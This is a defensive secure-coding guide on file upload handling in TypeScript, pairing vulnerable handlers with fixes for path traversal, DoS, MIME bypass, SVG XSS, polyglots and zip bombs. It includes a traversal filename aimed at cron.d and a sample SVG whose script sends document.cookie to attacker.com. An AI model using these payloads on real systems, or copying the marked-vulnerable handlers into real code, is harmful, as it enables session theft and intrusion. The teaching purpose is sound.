# File Upload Security

AI-generated upload handlers consistently omit every security control. The minimum working implementation — accept, buffer, write — ships with path traversal, DoS via oversized files, SVG XSS, and MIME type bypass as defaults.

## Failure 1: Path Traversal via Filename

Never use the user-supplied filename as the storage path. `../../../etc/passwd` is a valid filename on most systems.

```typescript
// BAD: path traversal via filename
const formData = await req.formData();
const file = formData.get('file') as File;
await fs.writeFile(`./uploads/${file.name}`, buffer);
// file.name = "../../../../etc/cron.d/backdoor" → writes to cron

// GOOD: generate a random filename, preserve extension only if needed
import { randomUUID } from 'crypto';
import path from 'path';

const originalName = file.name;
const ext = path.extname(originalName).toLowerCase().replace(/[^a-z0-9.]/g, '');
const safeName = `${randomUUID()}${ext}`;
await storage.upload(safeName, buffer); // never ./uploads/$userInput
```

On cloud storage (S3, Supabase Storage): always use generated keys. The user-visible "filename" can be stored as metadata.

## Failure 2: No Size Limit → DoS

Without a size limit, a single upload can exhaust disk space, memory, or serverless function timeout.

```typescript
// BAD: no size check — reads entire file into memory
const formData = await req.formData();
const file = formData.get('file') as File;
const bytes = await file.arrayBuffer();

// GOOD: check size before buffering
const MAX_SIZE_BYTES = 10 * 1024 * 1024; // 10 MB
if (file.size > MAX_SIZE_BYTES) {
  return new Response('File too large', { status: 413 });
}
const bytes = await file.arrayBuffer();
```

Also set limits at the infrastructure level — Vercel has a 4.5 MB body limit on Edge functions and 50 MB on Node.js functions. AWS API Gateway is 10 MB. Configure these limits explicitly; don't rely on defaults.

## Failure 3: MIME Type Bypass

The `Content-Type` header is user-controlled — an attacker sets it to `image/jpeg` while uploading a PHP shell or JavaScript file. Validating `file.type` validates the attacker-supplied value.

**Validate by magic bytes (file signature), not MIME type:**

```typescript
import { fileTypeFromBuffer } from 'file-type'; // reads actual magic bytes

const bytes = await file.arrayBuffer();
const buffer = Buffer.from(bytes);
const fileInfo = await fileTypeFromBuffer(buffer);

const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif'];
if (!fileInfo || !ALLOWED_TYPES.includes(fileInfo.mime)) {
  return new Response('File type not allowed', { status: 400 });
}
```

**Also validate the extension matches the magic bytes:**
```typescript
const ext = path.extname(file.name).toLowerCase();
const ALLOWED_EXTENSIONS: Record<string, string> = {
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.png': 'image/png',
  '.webp': 'image/webp',
};
if (ALLOWED_EXTENSIONS[ext] !== fileInfo.mime) {
  return new Response('Extension/content mismatch', { status: 400 });
}
```

## Failure 4: SVG XSS

SVG files are XML. They can contain `<script>` tags, `onload` handlers, and external resource references. Serving a user-uploaded SVG from your origin executes JavaScript in the context of your site.

```html
<!-- Attacker-uploaded SVG -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com?c='+document.cookie)</script>
</svg>
```

**Never serve user-uploaded SVGs from your own origin.**

Options:
1. **Reject SVG uploads entirely** — unless SVG is a specific product requirement
2. **Serve from a dedicated cookieless CDN domain** — `assets.yourapp.com` with no shared cookies, `Content-Disposition: attachment`, and `Content-Security-Policy: default-src 'none'`
3. **Sanitize with DOMPurify server-side** — strip all scripts and event handlers, but note that SVG sanitization is complex and libraries have had bypasses

## Failure 5: Polyglot Files (Image + Script)

A polyglot is a file that is simultaneously valid in two formats — e.g., valid JPEG *and* valid PHP or valid JavaScript. Magic byte validation passes because the JPEG header is real; execution bypasses because the script payload is also real.

**Fix:** Reconstruct images through a processing library to strip embedded payloads:

```typescript
import sharp from 'sharp';

// Re-encode through Sharp — strips all non-image data
const safeBuffer = await sharp(buffer)
  .jpeg({ quality: 85 })  // or .png() / .webp()
  .toBuffer();

await storage.upload(safeName, safeBuffer);
```

This approach also strips EXIF metadata (which can contain GPS coordinates and personal data — a privacy issue on top of the security one).

## Failure 6: Zip Bombs

Compressed uploads that decompress to terabytes. Check decompressed size before extracting.

```typescript
import { createReadStream } from 'fs';
import { createGunzip } from 'zlib';

const MAX_DECOMPRESSED = 100 * 1024 * 1024; // 100 MB

async function safeDecompress(compressedPath: string): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    let size = 0;
    const chunks: Buffer[] = [];
    const gunzip = createGunzip();

    gunzip.on('data', (chunk: Buffer) => {
      size += chunk.length;
      if (size > MAX_DECOMPRESSED) {
        gunzip.destroy();
        reject(new Error('Decompressed size exceeds limit'));
        return;
      }
      chunks.push(chunk);
    });

    gunzip.on('end', () => resolve(Buffer.concat(chunks)));
    gunzip.on('error', reject);

    createReadStream(compressedPath).pipe(gunzip);
  });
}
```

## Serving Uploaded Files Safely

```typescript
// Always set these headers when serving user-uploaded content:
res.setHeader('Content-Type', detectedMimeType);
res.setHeader('Content-Disposition', 'attachment; filename="file"'); // forces download
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('Content-Security-Policy', "default-src 'none'");

// Never serve from your main origin — use a dedicated CDN:
// GOOD: https://uploads.yourapp.com (separate cookies/CSP context)
// BAD: https://yourapp.com/uploads/file.svg (shares auth cookies with the app)
```

## Supabase Storage

Supabase Storage buckets need explicit RLS policies. Without policies, any authenticated user can upload to any path or read any file.

```sql
-- Only allow users to upload to their own folder
CREATE POLICY "user_uploads"
ON storage.objects FOR INSERT TO authenticated
WITH CHECK (
  bucket_id = 'uploads'
  AND (storage.foldername(name))[1] = (SELECT auth.uid())::text
);

-- Users can read their own files
CREATE POLICY "user_reads"
ON storage.objects FOR SELECT TO authenticated
USING (
  bucket_id = 'uploads'
  AND (storage.foldername(name))[1] = (SELECT auth.uid())::text
);
```

Also configure the bucket MIME type allowlist in Supabase Dashboard → Storage → bucket settings.
